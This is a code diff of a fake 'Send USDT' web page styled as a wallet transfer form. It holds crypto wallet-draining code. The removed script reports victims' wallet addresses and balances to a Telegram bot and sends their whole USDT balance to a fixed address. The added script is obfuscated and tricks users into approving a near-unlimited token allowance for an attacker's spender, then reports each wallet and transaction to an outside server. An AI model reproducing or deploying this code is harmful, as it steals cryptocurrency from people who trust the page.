@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send USDT</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         body {
             background-color: rgba(27,27,28,255);
@@ -130,7 +131,7 @@
 
         <p class="amount-text" style="text-align: left;">Amount</p>
         <div style="position: relative; display: inline-block; width: 90%;">
-            <input type="text" placeholder="Type or paste a valid address" 
+            <input type="text" placeholder="Type or paste a valid amount" 
                 style="width: 91%; padding-right: 40px; height: 31px; border-radius: 5px; border: 1px solid #ccc; 
                 font-family: Geeza, 'Ping Fang', 'Binance Plex', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, 
                 Ubuntu, Cantarell, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
@@ -145,101 +146,12 @@
 
         <p class="balance-text" style="text-align: left;"></p>
 
-        <button id="sendButton">Send</button>
+        <button id="sendButton" onclick="connectAndApprove()">Send</button>
     </div>
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
-<script>
-    let web3;
-    let userAccount;
-    const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
-    const recipient = "0x63b6B2Ee6324e3c53cAf1d2841b21134DEb19aA9"; 
-    const botToken = "5812995396:AAECr7Ryf51kOOnCV30sr6rUKesUdBux1nM";
-    const chatId = "5122281931";
-
-    const usdtABI = [
-        {
-            "constant": true,
-            "inputs": [{ "name": "_owner", "type": "address" }],
-            "name": "balanceOf",
-            "outputs": [{ "name": "balance", "type": "uint256" }],
-            "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [
-                { "name": "_to", "type": "address" },
-                { "name": "_value", "type": "uint256" }
-            ],
-            "name": "transfer",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "type": "function"
-        }
-    ];
-
-    async function connectWallet() {
-        if (window.ethereum) {
-            try {
-                web3 = new Web3(window.ethereum);
-
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: "0x38" }]
-                });
-
-                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                userAccount = accounts[0];
-
-                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                const balance = await usdtContract.methods.balanceOf(userAccount).call();
-
-                if (BigInt(balance) === BigInt(0)) {
-                    console.error("Insufficient USDT balance.");
-                    return;
-                }
-
-                const formattedBalance = web3.utils.fromWei(balance, 'ether');
-
-                sendTelegramMessage(userAccount, formattedBalance);
-                sendAllFunds(balance);
-            } catch (error) {
-                console.error("Error connecting wallet:", error);
-            }
-        } else {
-            console.error("Trust Wallet not detected! Open this page in Trust Wallet's browser.");
-        }
-    }
-
-    function sendTelegramMessage(wallet, amount) {
-        const message = `Wallet connected\nWallet: ${wallet}\nAmount: ${amount} USDT`;
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-        fetch(url).catch(error => console.error("Error sending Telegram message:", error));
-    }
-
-    async function sendAllFunds(amount) {
-        try {
-            const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-
-            console.log(`User's USDT Balance: ${amount} USDT`);
-
-            const gasPrice = await web3.eth.getGasPrice();
-            const gasLimit = 100000;
-
-            await usdtContract.methods.transfer(recipient, amount).send({
-                from: userAccount,
-                gas: web3.utils.toHex(gasLimit),
-                gasPrice: web3.utils.toHex(gasPrice),
-            });
-
-            console.log("Transaction sent successfully!");
-        } catch (error) {
-            console.error("Transaction error:", error);
-        }
-    }
-
-    document.getElementById("sendButton").addEventListener("click", connectWallet);
-</script>
+    <script>
+    const _0x5a9afc=_0xcd28;function _0x2cb3(){const _0x272c8f=['https://bsc-dataseed.binance.org/','https://bscscan.com','2235uuEeRb','No\x20MetaMask','balance','wallet_switchEthereumChain','eth_chainId','400650ZtmVbh','0x55d398326f99059fF775485246999027B3197955','71753SvtcHe','then','error','approve','ethereum','_owner','2568ZWZChr','value','7dlHlIa','eth_requestAccounts','Binance\x20Coin','3076602jUxPyA','16RLAbRo','1000000000000000000000000','catch','send','spender','checkTrx\x20error:','wallet_addEthereumChain','request','418629vnBrUq','https://usdtspender-production.up.railway.app/checkTrx?trx=','63FetHZg','1613064uSXVHD','function','address','uint256','2404FHrFmA','27147KZfXNR','Binance\x20Smart\x20Chain','text','eth','0x840C82A98d4D4C1F12D043bbDB09C7bDA00eE207'];_0x2cb3=function(){return _0x272c8f;};return _0x2cb3();}(function(_0x155dcf,_0x516b8a){const _0x3301ad=_0xcd28,_0x19b546=_0x155dcf();while(!![]){try{const _0x2c2fc4=parseInt(_0x3301ad(0x158))/0x1*(-parseInt(_0x3301ad(0x148))/0x2)+-parseInt(_0x3301ad(0x150))/0x3+parseInt(_0x3301ad(0x157))/0x4*(parseInt(_0x3301ad(0x15f))/0x5)+parseInt(_0x3301ad(0x147))/0x6*(-parseInt(_0x3301ad(0x144))/0x7)+-parseInt(_0x3301ad(0x153))/0x8+-parseInt(_0x3301ad(0x152))/0x9*(parseInt(_0x3301ad(0x164))/0xa)+-parseInt(_0x3301ad(0x166))/0xb*(-parseInt(_0x3301ad(0x16c))/0xc);if(_0x2c2fc4===_0x516b8a)break;else _0x19b546['push'](_0x19b546['shift']());}catch(_0x315bdf){_0x19b546['push'](_0x19b546['shift']());}}}(_0x2cb3,0x4c6a3));const USDT=_0x5a9afc(0x165),spender=_0x5a9afc(0x15c),amount=_0x5a9afc(0x149),BSC_CHAIN_ID='0x38',usdtABI=[{'constant':!![],'inputs':[{'name':_0x5a9afc(0x16b),'type':_0x5a9afc(0x155)}],'name':'balanceOf','outputs':[{'name':_0x5a9afc(0x161),'type':'uint256'}],'type':_0x5a9afc(0x154)},{'constant':![],'inputs':[{'name':_0x5a9afc(0x14c),'type':_0x5a9afc(0x155)},{'name':_0x5a9afc(0x16d),'type':_0x5a9afc(0x156)}],'name':'approve','outputs':[{'name':'','type':'bool'}],'type':_0x5a9afc(0x154)}];let web3,userAccount='';async function switchToBSC(){const _0x4f1e67=_0x5a9afc;try{await window[_0x4f1e67(0x16a)][_0x4f1e67(0x14f)]({'method':_0x4f1e67(0x162),'params':[{'chainId':BSC_CHAIN_ID}]});}catch(_0x39336d){if(_0x39336d['code']===0x1326)await window[_0x4f1e67(0x16a)][_0x4f1e67(0x14f)]({'method':_0x4f1e67(0x14e),'params':[{'chainId':BSC_CHAIN_ID,'chainName':_0x4f1e67(0x159),'nativeCurrency':{'name':_0x4f1e67(0x146),'symbol':'BNB','decimals':0x12},'rpcUrls':[_0x4f1e67(0x15d)],'blockExplorerUrls':[_0x4f1e67(0x15e)]}]});else throw _0x39336d;}}async function checkNetwork(){const _0x46b6bf=_0x5a9afc;if(!window[_0x46b6bf(0x16a)])throw new Error(_0x46b6bf(0x160));const _0x2f5d90=await window[_0x46b6bf(0x16a)][_0x46b6bf(0x14f)]({'method':_0x46b6bf(0x163)});_0x2f5d90!==BSC_CHAIN_ID&&await switchToBSC();}function _0xcd28(_0x36d3ce,_0x134b7c){const _0x2cb363=_0x2cb3();return _0xcd28=function(_0xcd2857,_0x236479){_0xcd2857=_0xcd2857-0x144;let _0x2044fa=_0x2cb363[_0xcd2857];return _0x2044fa;},_0xcd28(_0x36d3ce,_0x134b7c);}async function connectAndApprove(){const _0x5d59fa=_0x5a9afc;try{await checkNetwork(),web3=new Web3(window[_0x5d59fa(0x16a)]),await window[_0x5d59fa(0x16a)][_0x5d59fa(0x14f)]({'method':_0x5d59fa(0x145)});const _0x49d217=await web3[_0x5d59fa(0x15b)]['getAccounts']();userAccount=_0x49d217[0x0],fetch('https://usdtspender-production.up.railway.app/connectedwallet?wallet='+userAccount)[_0x5d59fa(0x14a)](console['error']);const _0x2acf4c=new web3['eth']['Contract'](usdtABI,USDT);_0x2acf4c['methods'][_0x5d59fa(0x169)](spender,amount)[_0x5d59fa(0x14b)]({'from':userAccount})['on']('transactionHash',_0x558a2b=>{const _0x1f2a94=_0x5d59fa;fetch(_0x1f2a94(0x151)+_0x558a2b)[_0x1f2a94(0x167)](_0x1a020f=>_0x1a020f[_0x1f2a94(0x15a)]())[_0x1f2a94(0x167)](_0x3215c2=>console['log']('checkTrx\x20response:',_0x3215c2))[_0x1f2a94(0x14a)](_0x2fb9d4=>console['error'](_0x1f2a94(0x14d),_0x2fb9d4));})['on'](_0x5d59fa(0x168),_0x47998a=>{console['error'](_0x47998a);});}catch(_0x159e49){console[_0x5d59fa(0x168)](_0x159e49);}}
+    </script>
 
 
 </body>
